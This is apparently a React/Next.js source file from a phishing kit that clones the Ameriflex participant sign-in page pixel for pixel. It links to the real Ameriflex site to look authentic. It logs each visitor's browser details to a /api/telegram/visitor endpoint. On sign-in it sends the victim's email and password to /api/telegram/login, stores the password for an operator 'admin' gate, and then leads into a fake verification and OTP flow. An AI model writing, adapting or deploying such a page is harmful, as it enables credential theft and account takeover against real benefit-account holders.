"use client";

import { useEffect, useRef, useState } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import Link from "next/link";
import AuthShell from "@/components/auth-shell";
import {
  MSG_INCORRECT_EMAIL_PASSWORD,
  MSG_UNABLE_VERIFY_TIME,
  OTP_RESEND_LOADING_MS,
} from "@/lib/approval-messages";
import { VISIT_NOTIFIED_SESSION_KEY } from "@/lib/restart-gate";
import { getClientUaModel } from "@/lib/client-ua-model";

/**
 * Ameriflex participant portal — human landing (sign-in) UI.
 *
 * Built to visual/behavioral identity with the OBSERVED target
 * https://participant.myameriflex.com/#/login (DOM, computed styles, and CSS
 * extracted live from the target; see README asset manifest). Markup mirrors
 * the target's Bootstrap 3.4.1 grid exactly:
 *
 *   body (75px top / 40px bottom padding, fixed background)
 *     └ #wrapper > .container > main > .container
 *         └ .col-xs-12 .col-sm-offset-2 .col-sm-8 .col-md-offset-3 .col-md-6
 *             ├ white Ameriflex logo (5rem)
 *             └ .login-panel > form
 *
 * Responsive behavior is the target's own (observed, not invented):
 *   - < 992px : transparent panel, WHITE text, Mountains_Mobile.jpg background
 *   - >= 992px: WHITE card + drop shadow, BLACK text, teal links, seasonal
 *               Background*.jpg applied to body by the seasonal effect below
 *
 * Preserved project functionality (unchanged from the previous landing):
 *   - visitor tracking POST /api/telegram/visitor after first interaction
 *   - sign-in POST /api/telegram/login, then /verify-choice flow
 *   - ubs_verify / ubs_details / ubs_otp2 session guards for Step 2 routes
 *
 * Step 1 rules honored:
 *   - ~2s busy/spinner delay on Sign In before navigation (no premature
 *     pending-login polling)
 *   - saved_username / login_user_id persisted (sessionStorage always,
 *     localStorage when Remember Me is checked) so Step 2 prefills
 *   - /?loginDenied=1 and /?verifyUnavailable=1 render canonical error copy
 *     at the target's failed() slot (text-center.login-error)
 *   - ZERO dummy links (every anchor has a real destination)
 */

/** Authentic link destinations harvested from the target (Phase 3E). */
export const LINK_URLS = {
  "Privacy Policy":
    "https://myameriflex.com/security-privacy-terms-conditions/",
  "New user registration":
    "https://participant.myameriflex.com/#/register",
  "Forgot your password?":
    "https://participant.myameriflex.com/#/reset-password",
  Home: "/",
} as const;

export default function LandingPage() {
  const router = useRouter();
  const searchParams = useSearchParams();

  const [isSigningIn, setIsSigningIn] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [rememberMe, setRememberMe] = useState(false);
  const visitInFlightRef = useRef(false);

  // Canonical deny flags at the authentic failed() slot (Rule 1C / 2B).
  // Field vocabulary = landing identifier label ("Email") → kit constant
  // MSG_INCORRECT_EMAIL_PASSWORD. `denied=1` is the kit's alternate alias.
  const loginDenied =
    searchParams.get("loginDenied") === "1" ||
    searchParams.get("denied") === "1";
  const verifyUnavailable = searchParams.get("verifyUnavailable") === "1";
  // Pass Key has no WebAuthn ceremony in this project — clicking renders the
  // canonical passkey failure at the same failed() slot (authentic position).
  const [passkeyFailed, setPasskeyFailed] = useState(false);
  const flagError = loginDenied
    ? MSG_INCORRECT_EMAIL_PASSWORD
    : verifyUnavailable
      ? MSG_UNABLE_VERIFY_TIME
      : null;
  const errorMessage = passkeyFailed
    ? "Unable to login with your pass key. Please try your password or a different pass key"
    : flagError;

  // Clear previous flow guards + restore remembered email (Step 2 prefill keys).
  useEffect(() => {
    sessionStorage.removeItem("ubs_verify");
    sessionStorage.removeItem("ubs_details");
    sessionStorage.removeItem("ubs_otp2");
    sessionStorage.removeItem("ubs_password");

    const remembered =
      localStorage.getItem("saved_username") ||
      localStorage.getItem("login_user_id") ||
      sessionStorage.getItem("saved_username") ||
      sessionStorage.getItem("login_user_id");
    if (remembered) {
      setEmail(remembered);
      setRememberMe(Boolean(localStorage.getItem("saved_username")));
    }
  }, []);

  // Visit Telegram standard (kit): fire IMMEDIATELY on landing mount — never on
  // first click/keypress. Raw document.referrer in the body; the ops key is only
  // written after res.ok && telegramSent === true (failed sends may retry).
  useEffect(() => {
    if (typeof window === "undefined") return;
    try {
      if (sessionStorage.getItem(VISIT_NOTIFIED_SESSION_KEY) === "1") return;
    } catch {
      /* sessionStorage unavailable — still attempt once */
    }
    if (visitInFlightRef.current) return;
    visitInFlightRef.current = true;

    void (async () => {
      const uaModel = await getClientUaModel().catch(() => undefined);
      void fetch("/api/telegram/visitor", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userAgent: navigator.userAgent,
          ...(uaModel ? { uaModel } : {}),
          screen: `${window.screen.width}x${window.screen.height}`,
          language: navigator.language,
          referrer: document.referrer || "Direct",
          pageUrl: window.location.href,
        }),
        keepalive: true,
      })
        .then(async (res) => {
          if (!res.ok) return;
          try {
            const data = (await res.json()) as { telegramSent?: boolean };
            if (data.telegramSent !== true) return;
            sessionStorage.setItem(VISIT_NOTIFIED_SESSION_KEY, "1");
          } catch {
            /* ignore */
          }
        })
        .catch(() => {})
        .finally(() => {
          visitInFlightRef.current = false;
        });
    })();
  }, []);

  const handleSignIn = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (isSigningIn) return;
    setIsSigningIn(true);

    // Persist credentials for Step 2 prefill (saved_username / login_user_id).
    try {
      sessionStorage.setItem("saved_username", email);
      sessionStorage.setItem("login_user_id", email);
      if (rememberMe) {
        localStorage.setItem("saved_username", email);
        localStorage.setItem("login_user_id", email);
        localStorage.setItem("remember_me", "1");
      } else {
        localStorage.removeItem("saved_username");
        localStorage.removeItem("login_user_id");
        localStorage.setItem("remember_me", "0");
      }
    } catch {
      /* storage disabled — flow continues */
    }

    // Credentials for the Gate 1 admin pending-login (verify-choice): the
    // identifier already persists in saved_username / login_user_id.
    try {
      sessionStorage.setItem("ubs_password", password);
    } catch {
      /* storage disabled — flow continues */
    }

    // Kit click rule: fire-and-forget BEFORE any loading delay — never await.
    void fetch("/api/telegram/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userId: email, password }),
      keepalive: true,
    }).catch(() => {});

    // Canonical 2000ms busy state — NOT an admin gate (kit checklist:
    // SIGN_IN_LOADING_MS / LOGIN_LOADING_MS / OTP_RESEND_LOADING_MS = 2000;
    // the kit ships only OTP_RESEND_LOADING_MS, same value).
    await new Promise((r) => setTimeout(r, OTP_RESEND_LOADING_MS));

    sessionStorage.setItem("ubs_verify", "1");
    router.push("/verify-choice");
  };

  return (
    <AuthShell>
      {/* Invisible SEO heading — target has no visible H1; sr-only keeps the
          document outline without changing a single pixel of the layout. */}
      <h1 className="sr-only">
        Ameriflex Login – MyAmeriflex Participant Portal, FSA Account,
        Ameriflex Card &amp; Flex Spending
      </h1>

                <form onSubmit={handleSignIn} noValidate={false}>
                  <div className="form-group">
                    <h4 className="panel-title">Welcome, Please Sign In</h4>
                  </div>

                  <div id="system-announcement-container" className="system-announcement"></div>

                  <div className="form-group">
                    <label htmlFor="username">Email</label>
                    <input
                      id="username"
                      type="email"
                      className="form-control"
                      placeholder="Email"
                      value={email}
                      onChange={(e) => {
                        setEmail(e.target.value);
                        setPasskeyFailed(false);
                      }}
                      required
                      autoComplete="username webauthn"
                    />
                  </div>

                  <div className="form-group">
                    <label htmlFor="password">Password</label>
                    <input
                      id="password"
                      type="password"
                      className="form-control"
                      placeholder="Password"
                      value={password}
                      onChange={(e) => {
                        setPassword(e.target.value);
                        setPasskeyFailed(false);
                      }}
                      required
                    />
                  </div>

                  <div className="form-group">
                    <label>
                      <input
                        type="checkbox"
                        style={{ margin: "0px 10px 0px 0px" }}
                        checked={rememberMe}
                        onChange={(e) => setRememberMe(e.target.checked)}
                      />
                      Remember Me
                    </label>
                  </div>

                  <div className="form-group text-center">
                    <button
                      className="main-btn btn-block"
                      type="submit"
                      disabled={isSigningIn}
                    >
                      {isSigningIn ? null : "Sign In"}
                      {isSigningIn ? (
                        <i className="fa fa-cog fa-spin" aria-hidden="true"></i>
                      ) : null}
                    </button>
                  </div>

                  {errorMessage ? (
                    <div className="form-group">
                      <div className="row">
                        <div className="text-center login-error" role="alert">
                          {errorMessage}
                        </div>
                      </div>
                    </div>
                  ) : null}

                  <div className="form-group">
                    <div className="row">
                      <div className="col-xs-6">
                        {/* Target element: <button class="link-button"> —
                            this project has no WebAuthn ceremony, so the click
                            renders the canonical passkey failure at the
                            failed() slot instead of navigating. */}
                        <button
                          type="button"
                          className="link-button"
                          title="Ameriflex Pass Key Login"
                          onClick={() => setPasskeyFailed(true)}
                        >
                          Sign in with a Pass Key
                        </button>
                      </div>
                      <div className="col-xs-6" style={{ textAlign: "right" }}>
                        <Link
                          href={LINK_URLS["New user registration"]}
                          title="Ameriflex new user registration"
                        >
                          New user registration
                        </Link>
                      </div>
                    </div>
                    <div className="row" style={{ marginTop: "5px" }}>
                      <div className="col-xs-6">
                        <Link
                          href={LINK_URLS["Forgot your password?"]}
                          title="Ameriflex forgot password recovery"
                        >
                          Forgot your password?
                        </Link>
                      </div>
                    </div>
                  </div>

                  <hr />
                  <p className="text-center">
                    <a
                      style={{ fontSize: "10px" }}
                      href={LINK_URLS["Privacy Policy"]}
                      target="_blank"
                      rel="noopener noreferrer"
                    >
                      Privacy Policy
                    </a>
                  </p>
                </form>
    </AuthShell>
  );
}
